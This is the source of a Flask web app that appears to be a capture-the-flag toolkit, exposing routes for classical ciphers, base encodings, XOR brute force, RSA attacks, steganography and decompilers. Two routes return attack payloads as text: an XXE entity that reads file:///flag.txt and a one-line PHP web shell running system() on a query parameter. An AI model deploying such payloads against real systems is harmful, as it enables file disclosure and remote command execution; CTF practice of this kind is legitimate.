"""`main` is the top level module for your Flask application."""
# Import the Flask Framework
from flask import Flask
from flask import render_template,request,send_from_directory
import ctftools
app = Flask(__name__)
# Note: We don't need to call run() since our application is embedded within
# the App Engine WSGI application server.


@app.route('/')
def hello():
    """Return a friendly HTTP greeting."""
    return render_template('index.html')

@app.route("/xml")
def xml():
	return """<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///flag.txt"> ]><news><data>&example;</data></news>"""

@app.route("/php")
def php():
	return "<?php echo system($_GET['cmd']);?>"

@app.route('/tools')
def tools():
	"""Return a friendly HTTP greeting."""
	return render_template('ctftools.html')

@app.route("/test")
def test():
	import pyjadx
	jadx = pyjadx.Jadx()
	app = jadx.load("mysecret.apk")
	packages = app.packages[::-1]
	page = 1
	return render_template('apkdecompile.html',page=1,packages=packages,id=[i for i in range(len(packages))])

@app.route('/autoCrypto',methods=["POST"])
def autoCrypto():
	return ctftools.autoCrypto(str(request.form['text']),'ignore' in request.form.keys())

@app.route('/caesar',methods=["POST"])
def caesar():
	return ctftools.caesar(str(request.form['text']),int(request.form['n']))

@app.route('/vigenere',methods=["POST"])
def vigenere():
	return ctftools.vigenere(str(request.form['text']),str(request.form['pass']),'encode' in request.form.keys())

@app.route('/base58',methods=["POST"])
def base58():
	return ctftools.b58(str(request.form['text']),'encode' in request.form.keys())

@app.route('/base64',methods=["POST"])
def base64():
	if 'encode' in request.form.keys():
		return ctftools.b64(str(request.form['text']),True)
	else:
		return ctftools.b64(str(request.form['text']))

@app.route('/base32',methods=["POST"])
def base32():
	if 'encode' in request.form.keys():
		return ctftools.b32(str(request.form['text']),True)
	else:
		return ctftools.b32(str(request.form['text']))

@app.route('/base85',methods=["POST"])
def base85():
	if 'encode' in request.form.keys():
		return ctftools.b85(str(request.form['text']),True)
	else:
		return ctftools.b85(str(request.form['text']))

@app.route('/ascii85',methods=["POST"])
def ascii85():
	if 'encode' in request.form.keys():
		return ctftools.ascii85(str(request.form['text']),True)
	else:
		return ctftools.ascii85(str(request.form['text']))

@app.route('/rot47',methods=["POST"])
def rot47():
	return ctftools.rot47(str(request.form['text']))

@app.route('/xor',methods=["POST"])
def xor():
	return ctftools.xor(str(request.form['text']),str(request.form['key']),str(request.form['selecttext']),str(request.form['selectkey']))

@app.route('/xorBrute',methods=["POST"])
def xorBrute():
	return ctftools.xorBrute(str(request.form['text']),str(request.form['selecttext']))

@app.route('/morse',methods=["POST"])
def morse():
	text = str(request.form['text'])
	if request.form['seperator'] == '':
		return ctftools.morse(text,encode='encode' in request.form.keys())
	else:
		seperator = request.form['seperator']
		return ctftools.morse(text,seperator,'encode' in request.form.keys())

@app.route('/letternum',methods=["POST"])
def letternum():
	text = str(request.form['text'])
	if request.form['seperator'] == '':
		return ctftools.letternum(text,encode='encode' in request.form.keys())
	else:
		seperator = request.form['seperator']
		return ctftools.letternum(text,seperator,'encode' in request.form.keys())

@app.route('/malbolge',methods=["POST"])
def malbolge():
	return ctftools.malbolge(str(request.form['text']))

@app.route('/decryptRSA',methods=["POST"])
def decrypt():
	return ctftools.decryptRSA(request.form['n'],request.form['e'],request.form['c'])

@app.route('/decryptRSAValues',methods=["POST"])
def decryptValues():
	args = [request.form['values']]
	if 'delta' in request.form.keys():
		args.append(str(request.form['delta']))
	if 'm' in request.form.keys():
		args.append(str(request.form['m']))

	return ctftools.decryptRSAValues(*args)

@app.route('/hastad',methods=["POST"])
def hastad():
	return ctftools.hastad(request.form['values'])

@app.route('/gcd',methods=["POST"])
def gcd():
	return ctftools.gcd(request.form['a'],request.form['b'])

@app.route('/number_to_ascii',methods=["POST"])
def number_to_ascii():
	text = str(request.form['text'])
	mode = str(request.form['mode'])
	if request.form['seperator'] == '':
		return ctftools.number_to_ascii(text,mode)
	else:
		seperator = request.form['seperator']
		return ctftools.number_to_ascii(text,mode,seperator)

@app.route('/ocr',methods=["POST"])
def ocr():
	return ctftools.ocr(request.files['file'])

@app.route('/zsteg',methods=["POST"])
def zsteg():
	return ctftools.zsteg(request.files['file'])

@app.route('/jsteg',methods=["POST"])
def jsteg():
        return ctftools.jsteg(request.files['file'])

@app.route('/strings',methods=["POST"])
def strings():
	return ctftools.strings(request.files['file'])

@app.route('/stegsolve',methods=["POST"])
def stegsolve():
	return ctftools.stegsolve(request.files['file'])

@app.route('/fernet',methods=["POST"])
def fernet():
	text = str(request.form['text'])
	key = str(request.form['key'])
	return ctftools.fernet(text,key,encode='encode' in request.form.keys())

@app.route('/webSource',methods=["POST"])
def webSource():
	text = str(request.form['text'])
	return ctftools.webSource(text)

@app.route('/pythonScript',methods=["POST"])
def pythonScript():
	text = str(request.form['text'])
	password = str(request.form['password'])
	return ctftools.pythonScript(text,password)

@app.route('/images/<path>')
def images(path):
    return send_from_directory('images', path)

@app.route('/ilspy',methods=["POST"])
def ilspy():
	return ctftools.ilspy(request.files['file'])

@app.route('/uncompyle',methods=["POST"])
def uncompyle():
	return ctftools.uncompyle(request.files['file'])

@app.errorhandler(404)
def page_not_found(e):
    """Return a custom 404 error."""
    return 'Sorry, Nothing at this URL.', 404


@app.errorhandler(500)
def application_error(e):
    """Return a custom 500 error."""
    return 'Sorry, unexpected error: {}'.format(e), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0')
